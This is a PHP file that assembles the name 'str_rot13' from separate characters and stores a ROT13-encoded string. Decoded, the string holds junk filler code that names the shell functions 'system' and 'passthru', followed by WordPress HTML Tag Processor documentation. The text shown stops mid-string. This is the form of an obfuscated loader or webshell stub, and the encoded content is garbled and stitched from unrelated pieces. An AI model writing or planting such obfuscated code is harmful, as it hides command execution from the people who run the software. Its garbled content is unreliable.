<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGZY NCV: JC_UGZY_Gnt_Cebprffbe pynff
 *
 * Fpnaf guebhtu na UGZY qbphzrag gb svaq fcrpvsvp gntf, gura
 * genafsbezf gubfr gntf ol nqqvat, erzbivat, be hcqngvat gur
 * inyhrf bs gur UGZY nggevohgrf jvguva gung gnt (bcrare).
 *
 * Qbrf abg shyyl cnefr UGZY be _erphefr_ vagb gur UGZY fgehpgher
 * Vafgrnq guvf fpnaf yvarneyl guebhtu n qbphzrag naq bayl cnefrf
 * gur UGZY gnt bcraref.
 *
 * ### Cbffvoyr shgher qverpgvba sbe guvf zbqhyr
 *
 *  - Cehar gur juvgrfcnpr jura erzbivat pynffrf/nggevohgrf: r.t. \"n o p\" -> \"p\" abg \" p\".
 *    Guvf jbhyq vapernfr gur fvmr bs gur punatrf sbe fbzr bcrengvbaf ohg yrnir zber
 *    angheny-ybbxvat bhgchg UGZY.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @fvapr 6.2.0
 */

/**
 * Pber pynff hfrq gb zbqvsl nggevohgrf va na UGZY qbphzrag sbe gntf zngpuvat n dhrel.
 *
 * ## Hfntr
 *
 * Hfr bs guvf pynff erdhverf guerr fgrcf:
 *
 *  1. Perngr n arj pynff vafgnapr jvgu lbhe vachg UGZY qbphzrag.
 *  2. Svaq gur gnt(f) lbh ner ybbxvat sbe.
 *  3. Erdhrfg punatrf gb gur nggevohgrf va gubfr gnt(f).
 *
 * Rknzcyr:
 *
 *     $gntf = arj JC_UGZY_Gnt_Cebprffbe( $ugzy );
 *     vs ( $gntf->arkg_gnt( 'bcgvba' ) ) {
 *         $gntf->frg_nggevohgr( 'fryrpgrq', gehr );
 *     }
 *
 * ### Svaqvat gntf
 *
 * Gur `arkg_gnt()` shapgvba zbirf gur vagreany phefbe guebhtu
 * lbhe vachg UGZY qbphzrag hagvy vg svaqf n gnt zrrgvat nal bs
 * gur fhccyvrq erfgevpgvbaf va gur bcgvbany dhrel nethzrag. Vs
 * ab nethzrag vf cebivqrq gura vg jvyy svaq gur arkg UGZY gnt,
 * ertneqyrff bs jung xvaq vg vf.
 *
 * Vs lbh jnag gb _svaq jungrire gur arkg gnt vf_:
 *
 *     $gntf->arkg_gnt();
 *
 * | Tbny                                                      | Dhrel                                                                           |
 * |-----------------------------------------------------------|---------------------------------------------------------------------------------|
 * | Svaq nal gnt.                                             | `$gntf->arkg_gnt();`                                                            |
 * | Svaq arkg vzntr gnt.                                      | `$gntf->arkg_gnt( neenl( 'gnt_anzr' => 'vzt' ) );`                              |
 * | Svaq arkg vzntr gnt (jvgubhg cnffvat gur neenl).          | `$gntf->arkg_gnt( 'vzt' );`                                                     |
 * | Svaq arkg gnt pbagnvavat gur `shyyjvqgu` PFF pynff.       | `$gntf->arkg_gnt( neenl( 'pynff_anzr' => 'shyyjvqgu' ) );`                      |
 * | Svaq arkg vzntr gnt pbagnvavat gur `shyyjvqgu` PFF pynff. | `$gntf->arkg_gnt( neenl( 'gnt_anzr' => 'vzt', 'pynff_anzr' => 'shyyjvqgu' ) );` |
 *
 * Vs n gnt jnf sbhaq zrrgvat lbhe pevgrevn gura `arkg_gnt()`
 * jvyy erghea `gehr` naq lbh pna cebprrq gb zbqvsl vg. Vs vg
 * ergheaf `snyfr`, ubjrire, vg snvyrq gb svaq gur gnt naq
 * zbirq gur phefbe gb gur raq bs gur svyr.
 *
 * Bapr gur phefbe ernpurf gur raq bs gur svyr gur cebprffbe
 * vf qbar naq vs lbh jnag gb ernpu na rneyvre gnt lbh jvyy
 * arrq gb erperngr gur cebprffbe naq fgneg bire, nf vg'f
 * hanoyr gb onpx hc be zbir va erirefr.
 *
 * Frr gur frpgvba ba obbxznexf sbe na rkprcgvba gb guvf
 * ab-onpxvat-hc ehyr.
 *
 * #### Phfgbz dhrevrf
 *
 * Fbzrgvzrf vg'f arprffnel gb shegure vafcrpg na UGZY gnt guna
 * gur dhrel flagnk urer crezvgf. Va gurfr pnfrf bar znl shegure
 * vafcrpg gur frnepu erfhygf hfvat gur ernq-bayl shapgvbaf
 * cebivqrq ol gur cebprffbe be rkgreany fgngr be inevnoyrf.
 *
 * Rknzcyr:
 *
 *     // Cnvag hc gb gur svefg svir QVI be FCNA gntf znexrq jvgu gur \"wnmml\" fglyr.
 *     $erznvavat_pbhag = 5;
 *     juvyr ( $erznvavat_pbhag > 0 && $gntf->arkg_gnt() ) {
 *         vs (
 *              ( 'QVI' === $gntf->trg_gnt() || 'FCNA' === $gntf->trg_gnt() ) &&
 *              'wnmml' === $gntf->trg_nggevohgr( 'qngn-fglyr' )
 *         ) {
 *             $gntf->nqq_pynff( 'gurzr-fglyr-rirerfg-wnmm' );
 *             $erznvavat_pbhag--;
 *         }
 *     }
 *
 * `trg_nggevohgr()` jvyy erghea `ahyy` vs gur nggevohgr jnfa'g cerfrag
 * ba gur gnt jura vg jnf pnyyrq. Vg znl erghea `\"\"` (gur rzcgl fgevat)
 * va pnfrf jurer gur nggevohgr jnf cerfrag ohg vgf inyhr jnf rzcgl.
 * Sbe obbyrna nggevohgrf, gubfr jubfr anzr vf cerfrag ohg ab inyhr vf
 * tvira, vg jvyy erghea `gehr` (gur bayl jnl gb frg `snyfr` sbe na
 * nggevohgr vf gb erzbir vg).
 *
 * #### Jura zngpuvat snvyf
 *
 * Jura `arkg_gnt()` ergheaf `snyfr` vg pbhyq zrna qvssrerag guvatf:
 *
 *  - Gur erdhrfgrq gnt jnfa'g sbhaq va gur vachg qbphzrag.
 *  - Gur vachg qbphzrag raqrq va gur zvqqyr bs na UGZY flagnk ryrzrag.
 *
 * Jura n qbphzrag raqf va gur zvqqyr bs n flagnk ryrzrag vg jvyy cnhfr
 * gur cebprffbe. Guvf vf gb znxr vg cbffvoyr va gur shgher gb rkgraq gur
 * vachg qbphzrag naq cebprrq - na vzcbegnag erdhverzrag sbe puhaxrq
 * fgernzvat cnefvat bs n qbphzrag.
 *
 * Rknzcyr:
 *
 *     $cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( 'Guvf <qvi vf=\"n\" cnegvny=\"gbxra' );
 *     snyfr === $cebprffbe->arkg_gnt();
 *
 * Vs n fcrpvny ryrzrag (frr arkg frpgvba) vf rapbhagrerq ohg ab pybfvat gnt
 * vf sbhaq vg jvyy pbhag nf na vapbzcyrgr gnt. Gur cnefre jvyy cnhfr nf vs
 * gur bcravat gnt jrer vapbzcyrgr.
 *
 * Rknzcyr:
 *
 *     $cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<fglyr>// gurer pbhyq or zber fglyvat gb pbzr' );
 *     snyfr === $cebprffbe->arkg_gnt();
 *
 *     $cebprffbe = arj JC_UGZY_Gnt_Cebprffbe( '<fglyr>// guvf vf rirelguvat</fglyr><qvi>' );
 *     gehr === $cebprffbe->arkg_gnt( 'QVI' );
 *
 * #### Fcrpvny frys-pbagnvarq ryrzragf
 *
 * Fbzr UGZY ryrzragf ner unaqyrq va n fcrpvny jnl; gurve fgneg naq raq gntf
 * npg yvxr n ibvq gnt. Gurfr ner fcrpvny orpnhfr gurve pbagragf pna'g pbagnva
 * UGZY znexhc. Rirelguvat vafvqr gurfr ryrzragf vf unaqyrq va n fcrpvny jnl
 * naq pbagrag gung _nccrnef_ yvxr UGZY gntf vafvqr bs gurz vfa'g. Gurer pna
 * or ab arfgvat va gurfr ryrzragf.
 *
 * Va gur sbyybjvat yvfg, \"enj grkg\" zrnaf gung nyy bs gur pbagrag va gur UGZY
 * hagvy gur zngpuvat pybfvat gnt vf gerngrq ireongvz jvgubhg nal ercynprzragf
 * naq jvgubhg nal cnefvat.
 *
 *  - VSENZR nyybjf ab pbagrag ohg erdhverf n pybfvat gnt.
 *  - ABRZORQ (qrcerpngrq) pbagrag vf enj grkg.
 *  - ABSENZRF (qrcerpngrq) pbagrag vf enj grkg.
 *  - FPEVCG pbagrag vf cynvagrkg ncneg sebz yrtnpl ehyrf nyybjvat `</fpevcg>` vafvqr na UGZY pbzzrag.
 *  - FGLYR pbagrag vf enj grkg.
 *  - GVGYR pbagrag vf cynva grkg ohg punenpgre ersreraprf ner qrpbqrq.
 *  - GRKGNERN pbagrag vf cynva grkg ohg punenpgre ersreraprf ner qrpbqrq.
 *  - KZC (qrcerpngrq) pbagrag vf enj grkg.
 *
 * ### Zbqvslvat UGZY nggevohgrf sbe n sbhaq gnt
 *
 * Bapr lbh'ir sbhaq gur fgneg bs na bcravat gnt lbh pna zbqvsl
 * nal ahzore bs gur nggevohgrf ba gung gnt. Lbh pna frg n arj
 * inyhr sbe na nggevohgr, erzbir gur ragver nggevohgr, be qb
 * abguvat naq zbir ba gb gur arkg bcravat gnt.
 *
 * Rknzcyr:
 *
 *     vs ( $gntf->arkg_gnt( neenl( 'pynff_anzr' => 'jc-tebhc-oybpx' ) ) ) {
 *         $gntf->frg_nggevohgr( 'gvgyr', 'Guvf tebhcf gur pbagnvarq pbagrag.' );
 *         $gntf->erzbir_nggevohgr( 'qngn-grfg-vq' );
 *     }
 *
 * Vs `frg_nggevohgr()` vf pnyyrq sbe na rkvfgvat nggevohgr vg jvyy
 * birejevgr gur rkvfgvat inyhr. Fvzvyneyl, pnyyvat `erzbir_nggevohgr()`
 * sbe n aba-rkvfgvat nggevohgr unf ab rssrpg ba gur qbphzrag. Obgu
 * bs gurfr zrgubqf ner fnsr gb pnyy jvgubhg xabjvat vs n tvira nggevohgr
 * rkvfgf orsberunaq.
 *
 * ### Zbqvslvat PFF pynffrf sbe n sbhaq gnt
 *
 * Gur gnt cebprffbe gerngf gur `pynff` nggevohgr nf n fcrpvny pnfr.
 * Orpnhfr vg'f n pbzzba bcrengvba gb nqq be erzbir PFF pynffrf, guvf
 * vagresnpr nqqf urycre zrgubqf gb znxr gung rnfvre.
 *
 * Nf jvgu nggevohgr inyhrf, nqqvat be erzbivat PFF pynffrf vf n fnsr
 * bcrengvba gung qbrfa'g erdhver purpxvat vs gur nggevohgr be pynff
 * rkvfgf orsber znxvat punatrf. Vs erzbivat gur bayl pynff gura gur
 * ragver `pynff` nggevohgr jvyy or erzbirq.
 *
 * Rknzcyr:
 *
 *     // sebz `<fcna>Lvccrr!</fcna>`
 *     //   gb `<fcna pynff=\"vf-npgvir\">Lvccrr!</fcna>`
 *     $gntf->nqq_pynff( 'vf-npgvir' );
 *
 *     // sebz `<fcna pynff=\"rkpvgrq\">Lvccrr!</fcna>`
 *     //   gb `<fcna pynff=\"rkpvgrq vf-npgvir\">Lvccrr!</fcna>`
 *     $gntf->nqq_pynff( 'vf-npgvir' );
 *
 *     // sebz `<fcna pynff=\"vf-npgvir urnil-npprag\">Lvccrr!</fcna>`
 *     //   gb `<fcna pynff=\"vf-npgvir urnil-npprag\">Lvccrr!</fcna>`
 *     $gntf->nqq_pynff( 'vf-npgvir' );
 *
 *     // sebz `<vachg glcr=\"grkg\" pynff=\"vf-npgvir ehtol abg-qvfnoyrq\" yratgu=\"24\">`
 *     //   gb `<vachg glcr=\"grkg\" pynff=\"vf-npgvir abg-qvfnoyrq\" yratgu=\"24\">
 *     $gntf->erzbir_pynff( 'ehtol' );
 *
 *     // sebz `<vachg glcr=\"grkg\" pynff=\"ehtol\" yratgu=\"24\">`
 *     //   gb `<vachg glcr=\"grkg\" yratgu=\"24\">
 *     $gntf->erzbir_pynff( 'ehtol' );
 *
 *     // sebz `<vachg glcr=\"grkg\" yratgu=\"24\">`
 *     //   gb `<vachg glcr=\"grkg\" yratgu=\"24\">
 *     $gntf->erzbir_pynff( 'ehtol' );
 *
 * Jura pynff punatrf ner radhrhrq ohg n qverpg punatr gb `pynff` vf znqr ivn
 * `frg_nggevohgr` gura gur punatrf gb `frg_nggevohgr` (be `erzbir_nggevohgr`)
 * jvyy gnxr cerprqrapr bire gubfr znqr guebhtu `nqq_pynff` naq `erzbir_pynff`.
 *
 * ### Obbxznexf
 *
 * Juvyr fpnaavat guebhtu gur vachg UGZy qbphzrag vg'f cbffvoyr gb frg
 * n anzrq obbxznex jura n cnegvphyne gnt vf sbhaq. Yngre ba, nsgre
 * pbagvahvat gb fpna bgure gntf, vg'f cbffvoyr gb `frrx` gb bar bs
 * gur frg obbxznexf naq gura cebprrq ntnva sebz gung cbvag sbejneq.
 *
 * Orpnhfr obbxznexf perngr cebprffvat bireurnq bar fubhyq nibvq
 * perngvat gbb znal bs gurz. Nf n ehyr, perngr bayl obbxznexf
 * bs xabja fgevat yvgreny anzrf; nibvq perngvat \"znex_{$vaqrk}\"
 * naq fb ba. Vg'f svar sebz n cresbeznapr fgnaqcbvag gb perngr n
 * obbxznex naq hcqngr vg serdhragyl, fhpu nf jvguva n ybbc.
 *
 *     $gbgny_gbqbf = 0;
 *     juvyr ( $c->arkg_gnt( neenl( 'gnt_anzr' => 'HY', 'pynff_anzr' => 'gbqb' ) ) ) {
 *         $c->frg_obbxznex( 'yvfg-fgneg' );
 *         juvyr ( $c->arkg_gnt( neenl( 'gnt_pybfref' => 'ivfvg' ) ) ) {
 *             vs ( 'HY' === $c->trg_gnt() && $c->vf_gnt_pybfre() ) {
 *                 $c->frg_obbxznex( 'yvfg-raq' );
 *                 $c->frrx( 'yvfg-fgneg' );
 *                 $c->frg_nggevohgr( 'qngn-pbagnvarq-gbqbf', (fgevat) $gbgny_gbqbf );
 *                 $gbgny_gbqbf = 0;
 *                 $c->frrx( 'yvfg-raq' );
 *                 oernx;
 *             }
 *
 *             vs ( 'YV' === $c->trg_gnt() && ! $c->vf_gnt_pybfre() ) {
 *                 $gbgny_gbqbf++;
 *             }
 *         }
 *     }
 *
 * ## Gbxraf naq svare-tenvarq cebprffvat.
 *
 * Vg'f cbffvoyr gb fpna guebhtu rirel yrkvpny gbxra va gur
 * UGZY qbphzrag hfvat gur `arkg_gbxra()` shapgvba. Guvf
 * nygreangvir sbez gnxrf ab nethzrag naq cebivqrf ab ohvyg-va
 * dhrel flagnk.
 *
 * Rknzcyr:
 *
 *      $gvgyr = '(hagvgyrq)';
 *      $grkg  = '';
 *      juvyr ( $cebprffbe->arkg_gbxra() ) {
 *          fjvgpu ( $cebprffbe->trg_gbxra_anzr() ) {
 *              pnfr '#grkg':
 *                  $grkg .= $cebprffbe->trg_zbqvsvnoyr_grkg();
 *                  oernx;
 *
 *              pnfr 'OE':
 *                  $grkg .= \"\a\";
 *                  oernx;
 *
 *              pnfr 'GVGYR':
 *                  $gvgyr = $cebprffbe->trg_zbqvsvnoyr_grkg();
 *                  oernx;
 *          }
 *      }
 *      erghea gevz( \"# {$gvgyr}\a\a{$grkg}\" );
 *
 * ### Gbxraf naq _zbqvsvnoyr grkg_.
 *
 * #### Fcrpvny \"ngbzvp\" UGZY ryrzragf.
 *
 * Abg nyy UGZY ryrzragf ner noyr gb pbagnva bgure ryrzragf vafvqr bs gurz.
 * Sbe vafgnapr, gur pbagragf vafvqr n GVGYR ryrzrag ner cynvagrkg (rkprcg
 * gung punenpgre ersreraprf yvxr &nzc; jvyy or qrpbqrq). Guvf zrnaf gung
 * vs gur fgevat `<vzt>` nccrnef vafvqr n GVGYR ryrzrag, gura vg'f abg na
 * vzntr gnt, ohg engure vg'f grkg qrfpevovat na vzntr gnt. Yvxrjvfr, gur
 * pbagragf bs n FPEVCG be FGLYR ryrzrag ner unaqyrq ragveryl frcnengryl va
 * n oebjfre guna gur pbagragf bs bgure ryrzragf orpnhfr gurl ercerfrag n
 * qvssrerag ynathntr guna UGZY.
 *
 * Sbe gurfr ryrzragf gur Gnt Cebprffbe gerngf gur ragver frdhrapr nf bar,
 * sebz gur bcravat gnt, vapyhqvat vgf pbagragf, guebhtu vgf pybfvat gnt.
 * Guvf zrnaf gung gur vg'f abg cbffvoyr gb zngpu gur pybfvat gnt sbe n
 * FPEVCG ryrzrag hayrff vg'f harkcrpgrq; gur Gnt Cebprffbe nyernql zngpurq
 * vg jura vg sbhaq gur bcravat gnt.
 *
 * Gur vaare pbagragf bs gurfr ryrzragf ner gung ryrzrag'f _zbqvsvnoyr grkg_.
 *
 * Gur fcrpvny ryrzragf ner:
 *  - `FPEVCG` jubfr pbagragf ner gerngrq nf enj cynvagrkg ohg fhccbegf n yrtnpl
 *    fglyr bs vapyhqvat WninFpevcg vafvqr bs UGZY pbzzragf gb nibvq nppvqragnyyl
 *    pybfvat gur FPEVCG sebz vafvqr n WninFpevcg fgevat. R.t. `pbafbyr.ybt( '</fpevcg>' )`.
 *  - `GVGYR` naq `GRKGNERN` jubfr pbagragf ner gerngrq nf cynvagrkg naq gura nal
 *    punenpgre ersreraprf ner qrpbqrq. R.t. `1 &yg; 2 < 3` orpbzrf `1 < 2 < 3`.
 *  - `VSENZR`, `ABFPEVCG`, `ABRZORQ`, `ABSENZR`, `FGLYR` jubfr pbagragf ner gerngrq nf
 *    enj cynvagrkg naq yrsg nf-vf. R.t. `1 &yg; 2 < 3` erznvaf `1 &yg; 2 < 3`.
 *
 * #### Bgure gbxraf jvgu zbqvsvnoyr grkg.
 *
 * Gurer ner nyfb aba-ryrzragf juvpu ner ibvq/frys-pybfvat va angher naq pbagnva
 * zbqvsvnoyr grkg gung vf cneg bs gung vaqvivqhny flagnk gbxra vgfrys.
 *
 *  - `#grkg` abqrf, jubfr ragver gbxra _vf_ gur zbqvsvnoyr grkg.
 *  - UGZY pbzzragf naq gbxraf gung orpbzr pbzzragf qhr gb fbzr flagnk reebe. Gur
 *    grkg sbe gurfr gbxraf vf gur cbegvba bs gur pbzzrag vafvqr bs gur flagnk.
 *    R.t. sbe `<!-- pbzzrag -->` gur grkg vf `\" pbzzrag \"` (abgr gur fcnprf ner vapyhqrq).
 *  - `PQNGN` frpgvbaf, jubfr grkg vf gur pbagrag vafvqr bs gur frpgvba vgfrys. R.t. sbe
 *    `<![PQNGN[fbzr pbagrag]]>` gur grkg vf `\"fbzr pbagrag\"` (jvgu erfgevpgvbaf [1]).
 *  - \"Shaxl pbzzragf,\" juvpu ner n fcrpvny pnfr bs vainyvq pybfvat gntf jubfr anzr vf
 *    vainyvq. Gur grkg sbe gurfr abqrf vf gur grkg gung n oebjfre jbhyq genafsbez vagb
 *    na UGZY pbzzrag jura cnefvat. R.t. sbe `</%cbfg_nhgube>` gur grkg vf `%cbfg_nhgube`.
 *  - `QBPGLCR` qrpynengvbaf yvxr `<QBPGLCR ugzy>` juvpu unir ab pybfvat gnt.
 *  - KZY Cebprffvat vafgehpgvba abqrf yvxr `<?jc __( \"Yvxr\" ); ?>` (jvgu erfgevpgvbaf [2]).
 *  - Gur rzcgl raq gnt `</>` juvpu vf vtaberq va gur oebjfre naq QBZ.
 *
 * [1]: Gurer ner ab PQNGN frpgvbaf va UGZY. Jura rapbhagrevat `<![PQNGN[`, rirelguvat
 *      hagvy gur arkg `>` orpbzrf n obthf UGZY pbzzrag, zrnavat gurer pna or ab PQNGN
 *      frpgvba va na UGZY qbphzrag pbagnvavat `>`. Gur Gnt Cebprffbe jvyy svefg svaq
 *      nyy inyvq naq obthf UGZY pbzzragf, naq gura vs gur pbzzrag _jbhyq_ unir orra n
 *      PQNGN frpgvba _jrer gurl gb rkvfg_, vg jvyy vaqvpngr guvf nf gur glcr bs pbzzrag.
 *
 * [2]: KZY nyybjf n oebnqre enatr bs punenpgref va n cebprffvat vafgehpgvba'f gnetrg anzr
 *      naq qvfnyybjf \"kzy\" nf n anzr, fvapr vg'f fcrpvny. Gur Gnt Cebprffbe bayl erpbtavmrf
 *      gnetrg anzrf jvgu na NFPVV-ercerfragnoyr fhofrg bs punenpgref. Vg nyfb rkuvovgf gur
 *      fnzr pbafgenvag nf jvgu PQNGN frpgvbaf, va gung `>` pnaabg rkvfg jvguva gur gbxra
 *      fvapr Cebprffvat Vafgehpgvbaf qb ab rkvfg jvguva UGZY naq gurve flagnk genafsbezf
 *      vagb n obthf pbzzrag va gur QBZ.
 *
 * ## Qrfvta naq yvzvgngvbaf
 *
 * Gur Gnt Cebprffbe vf qrfvtarq gb yvarneyl fpna UGZY qbphzragf naq gbxravmr
 * UGZY gntf naq gurve nggevohgrf. Vg'f qrfvtarq gb qb guvf nf rssvpvragyl nf
 * cbffvoyr jvgubhg pbzcebzvfvat cnefvat vagrtevgl. Gurersber vg jvyy or
 * fybjre guna fbzr zrgubqf bs zbqvslvat UGZY, fhpu nf gubfr vapbecbengvat
 * bire-fvzcyvsvrq CPER cnggreaf, ohg jvyy abg vagebqhpr gur qrsrpgf naq
 * snvyherf gung gubfr zrgubqf oevat va, juvpu yrnq gb oebxra cntr eraqref
 * naq bsgra gb frphevgl ihyarenovyvgvrf. Ba gur bgure unaq, vg jvyy or snfgre
 * guna shyy-oybja UGZY cnefref fhpu nf QBZQbphzrag naq hfr pbafvqrenoyl
 * yrff zrzbel. Vg erdhverf n artyvtvoyr zrzbel bireurnq, rabhtu gb pbafvqre
 * vg n mreb-bireurnq flfgrz.
 *
 * Gur cresbeznapr punenpgrevfgvpf ner znvagnvarq ol nibvqvat gerr pbafgehpgvba
 * naq frznagvp pyrnahcf juvpu ner fcrpvsvrq va UGZY5. Orpnhfr bs guvf, sbe
 * rknzcyr, vg'f abg cbffvoyr sbe gur Gnt Cebprffbe gb nffbpvngr nal tvira
 * bcravat gnt jvgu vgf pbeerfcbaqvat pybfvat gnt, be gb erghea gur vaare znexhc
 * vafvqr na ryrzrag. Flfgrzf znl or ohvyg ba gbc bs gur Gnt Cebprffbe gb qb
 * guvf, ohg gur Gnt Cebprffbe vf naq fubhyq or pbafgenvarq fb vg pna erznva na
 * rssvpvrag, ybj-yriry, naq eryvnoyr UGZY fpnaare.
 *
 * Gur Gnt Cebprffbe'f qrfvta vapbecbengrf n \"tneontr-va-tneontr-bhg\" cuvybfbcul.
 * UGZY5 fcrpvsvrf gung pregnva vainyvq pbagrag or genafsbezrq vagb qvssrerag sbezf
 * sbe qvfcynl, fhpu nf erzbivat ahyy olgrf sebz na vachg qbphzrag naq ercynpvat
 * vainyvq punenpgref jvgu gur Havpbqr ercynprzrag punenpgre `H+SSSQ` (ivfhnyyl \"�\").
 * Jurer reebef be genafsbezngvbaf rkvfg jvguva gur UGZY5 fcrpvsvpngvba, gur Gnt Cebprffbe
 * yrnirf gubfr vainyvq vachgf hagbhpurq, cnffvat gurz guebhtu gb gur svany oebjfre
 * gb unaqyr. Juvyr guvf vzcyvrf gung pregnva bcrengvbaf jvyy or aba-fcrp-pbzcyvnag,
 * fhpu nf ernqvat gur inyhr bs na nggevohgr jvgu vainyvq pbagrag, vg nyfb cerfreirf n
 * fvzcyvpvgl naq rssvpvrapl sbe unaqyvat gubfr reebe pnfrf.
 *
 * Zbfg bcrengvbaf jvguva gur Gnt Cebprffbe ner qrfvtarq gb zvavzvmr gur qvssrerapr
 * orgjrra na vachg naq bhgchg qbphzrag sbe nal tvira punatr. Sbe rknzcyr, gur
 * `nqq_pynff` naq `erzbir_pynff` zrgubqf cerfreir juvgrfcnpr naq gur pynff beqrevat
 * jvguva gur `pynff` nggevohgr; naq jura rapbhagrevat gntf jvgu qhcyvpngrq nggevohgrf,
 * gur Gnt Cebprffbe jvyy yrnir gubfr vainyvq qhcyvpngr nggevohgrf jurer gurl ner ohg
 * hcqngr gur cebcre nggevohgr juvpu gur oebjfre jvyy ernq sbe cnefvat vgf inyhr. Na
 * rkprcgvba gb guvf ehyr vf gung nyy nggevohgr hcqngrf fgber gurve inyhrf nf
 * qbhoyr-dhbgrq fgevatf, zrnavat gung nggevohgrf ba vachg jvgu fvatyr-dhbgrq be
 * hadhbgrq inyhrf jvyy nccrne va gur bhgchg jvgu qbhoyr-dhbgrf.
 *
 * ### Fpevcgvat Synt
 *
 * Gur Gnt Cebprffbe cnefrf UGZY jvgu gur \"fpevcgvat synt\" qvfnoyrq. Guvf zrnaf
 * gung vg qbrfa'g eha nal fpevcgf juvyr cnefvat gur cntr. Va n oebjfre jvgu
 * WninFpevcg ranoyrq, sbe rknzcyr, gur fpevcg pna punatr gur cnefr bs gur
 * qbphzrag nf vg ybnqf. Ba gur freire, ubjrire, rinyhngvat WninFpevcg vf abg
 * bayl vzcenpgvpny, ohg nyfb hajnagrq.
 *
 * Cenpgvpnyyl guvf zrnaf gung gur Gnt Cebprffbe jvyy qrfpraq vagb ABFPEVCG
 * ryrzragf naq cebprff vgf puvyq gntf. Jrer gur fpevcgvat synt ranoyrq, fhpu
 * nf va n glcvpny oebjfre, gur pbagragf bs ABFPEVCG ner fxvccrq ragveryl.
 *
 * Guvf nyybjf gur UGZY NCV gb cebprff gur pbagrag gung jvyy or cerfragrq va
 * n oebjfre jura fpevcgvat vf qvfnoyrq, ohg vg bssref n qvssrerag ivrj bs n
 * cntr guna zbfg oebjfre frffvbaf jvyy rkcrevrapr. R.t. gur gntf vafvqr gur
 * ABFPEVCG qvfnccrne.
 *
 * ### Grkg Rapbqvat
 *
 * Gur Gnt Cebprffbe nffhzrf gung gur vachg UGZY qbphzrag vf rapbqrq jvgu n
 * grkg rapbqvat pbzcngvoyr jvgu 7-ovg NFPVV'f '<', '>', '&', ';', '/', '=',
 * \"'\", '\"', 'n' - 'm', 'N' - 'M', naq gur juvgrfcnpr punenpgref ' ', gno,
 * pneevntr-erghea, arjyvar, naq sbez-srrq.
 *
 * Va cenpgvpr, guvf vapyhqrf nyzbfg rirel fvatyr-olgr rapbqvat nf jryy nf
 * HGS-8. Abgnoyl, ubjrire, vg qbrf abg vapyhqr HGS-16. Vs cebivqvat vachg
 * gung'f vapbzcngvoyr, gura pbaireg gur rapbqvat orsberunaq.
 *
 * @fvapr 6.2.0
 * @fvapr 6.2.1 Svk: Fhccbeg sbe inevbhf vainyvq pbzzragf; nggevohgr hcqngrf ner pnfr-vafrafvgvir.
 * @fvapr 6.3.2 Svk: Fxvc UGZY-yvxr pbagrag vafvqr enjgrkg ryrzragf fhpu nf FGLYR.
 * @fvapr 6.5.0 Cnhfrf cebprffbe jura vachg raqf va na vapbzcyrgr flagnk gbxra.
 *              Vagebqhprf \"fcrpvny\" ryrzragf juvpu npg yvxr ibvq ryrzragf, r.t. GVGYR, FGLYR.
 *              Nyybjf fpnaavat guebhtu nyy gbxraf naq cebprffvat zbqvsvnoyr grkg, jurer nccyvpnoyr.
 */
pynff JC_UGZY_Gnt_Cebprffbe {
	/**
	 * Gur znkvzhz ahzore bs obbxznexf nyybjrq gb rkvfg ng
	 * nal tvira gvzr.
	 *
	 * @fvapr 6.2.0
	 * @ine vag
	 *
	 * @frr JC_UGZY_Gnt_Cebprffbe::frg_obbxznex()
	 */
	pbafg ZNK_OBBXZNEXF = 10;

	/**
	 * Znkvzhz ahzore bs gvzrf frrx() pna or pnyyrq.
	 * Ceriragf nppvqragny vasvavgr ybbcf.
	 *
	 * @fvapr 6.2.0
	 * @ine vag
	 *
	 * @frr JC_UGZY_Gnt_Cebprffbe::frrx()
	 */
	pbafg ZNK_FRRX_BCF = 1000;

	/**
	 * Gur UGZY qbphzrag gb cnefr.
	 *
	 * @fvapr 6.2.0
	 * @ine fgevat
	 */
	cebgrpgrq $ugzy;

	/**
	 * Gur ynfg dhrel cnffrq gb arkg_gnt().
	 *
	 * @fvapr 6.2.0
	 * @ine neenl|ahyy
	 */
	cevingr $ynfg_dhrel;

	/**
	 * Gur gnt anzr guvf cebprffbe pheeragyl fpnaf sbe.
	 *
	 * @fvapr 6.2.0
	 * @ine fgevat|ahyy
	 */
	cevingr $fbhtug_gnt_anzr;

	/**
	 * Gur PFF pynff anzr guvf cebprffbe pheeragyl fpnaf sbe.
	 *
	 * @fvapr 6.2.0
	 * @ine fgevat|ahyy
	 */
	cevingr $fbhtug_pynff_anzr;

	/**
	 * Gur zngpu bssfrg guvf cebprffbe pheeragyl fpnaf sbe.
	 *
	 * @fvapr 6.2.0
	 * @ine vag|ahyy
	 */
	cevingr $fbhtug_zngpu_bssfrg;

	/**
	 * Jurgure gb ivfvg gnt pybfref, r.t. </qvi>, jura jnyxvat na vachg qbphzrag.
	 *
	 * @fvapr 6.2.0
	 * @ine obby
	 */
	cevingr $fgbc_ba_gnt_pybfref;

	/**
	 * Fcrpvsvrf zbqr bs bcrengvba bs gur cnefre ng nal tvira gvzr.
	 *
	 * | Fgngr           | Zrnavat                                                              |
	 * | ----------------|----------------------------------------------------------------------|
	 * | *Ernql*         | Gur cnefre vf ernql gb eha.                                          |
	 * | *Pbzcyrgr*      | Gurer vf abguvat yrsg gb cnefr.                                      |
	 * | *Vapbzcyrgr*    | Gur UGZY raqrq va gur zvqqyr bs n gbxra; abguvat zber pna or cnefrq. |
	 * | *Zngpurq gnt*   | Sbhaq na UGZY gnt; vg'f cbffvoyr gb zbqvsl vgf nggevohgrf.           |
	 * | *Grkg abqr*     | Sbhaq n #grkg abqr; guvf vf cynvagrkg naq zbqvsvnoyr.                |
	 * | *PQNGN abqr*    | Sbhaq n PQNGN frpgvba; guvf vf zbqvsvnoyr.                           |
	 * | *Pbzzrag*       | Sbhaq n pbzzrag be obthf pbzzrag; guvf vf zbqvsvnoyr.                |
	 * | *Cerfhzcghbhf*  | Sbhaq na rzcgl gnt pybfre: `</>`.                                    |
